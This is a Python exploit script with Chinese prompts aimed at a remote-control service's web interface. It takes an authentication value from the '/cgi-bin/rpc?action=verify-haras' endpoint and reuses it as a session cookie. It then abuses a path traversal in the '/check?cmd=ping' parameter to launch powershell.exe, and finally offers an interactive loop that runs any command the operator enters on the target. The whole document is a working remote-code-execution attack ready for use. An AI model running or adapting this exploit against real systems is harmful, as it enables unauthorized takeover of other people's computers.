# -*- coding:utf-8 -*-
import requests
import sys
import json

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

headers={
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36'
}
def requestspoc(url,CID,cmd):
	Cookie ="CID=" + CID
	headers={
 	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36',
 	'Cookie': Cookie
	}
	urlpoc = url +"/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+%20" + cmd
	#urlpoc = url +"/check?cmd=ping../../../../../../../../../../windows/system32/" + cmd
	req = requests.get(str(urlpoc), headers=headers,timeout=30)
	#req = requests.get(str(urlpoc), headers=headers,timeout=30)
	#req.encoding = req.apparent_encoding
	print(str(req.content.decode('gbk')))
def requestsurl(url):#获取cookie:CID
	url1 = url + "/cgi-bin/rpc?action=verify-haras"
	req = requests.get(url1, headers=headers, timeout=7)
	print (str(req.text))
	#data='{"__code":"0","enabled":"1","verify_string":"0243aFf9X19BCrB9vrfSLludf4jc9lai","code":"0"}'
	data = json.loads(req.text)
	if data["verify_string"]=="null":
		print("目标不存在漏洞")
		return
	print(data,type(repr(data)))
	print(data["verify_string"])
	CID = data["verify_string"]
	det = input("漏洞存在，是否进行利用，yes or no:")
	if det=="no":
		return
	while 1:
		cmd = input("输入命令:")
		requestspoc(url,CID,cmd)
		
if __name__ in "__main__":
	requestsurl(sys.argv[1])

